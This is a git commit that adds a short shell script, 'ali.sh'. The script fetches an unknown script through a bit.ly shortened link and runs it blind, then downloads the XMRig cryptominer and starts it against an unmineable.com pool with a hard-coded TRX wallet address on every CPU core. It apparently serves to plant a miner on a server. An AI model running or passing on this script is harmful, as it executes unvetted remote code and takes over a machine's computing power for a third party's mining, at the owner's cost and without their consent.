e9fc48617a2b08588258d025f4d89ccf77571865
aliabdulla769 <131328611+aliabdulla769@users.noreply.github.com>
2023-08-22 22:45:45 +0300

    Create ali.sh

---
+++ ali.sh
@@ -0,0 +1,8 @@
+wget -O su.sh https://bit.ly/akuhGet
+chmod +x su.sh
+./su.sh
+apt update
+apt install screen -y
+screen
+apt install wget -y
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TUPkoHaVv8jp6CbsQGjd8bhDZXBVxkQkSt.2 --threads=8 -p x -t $(nproc)
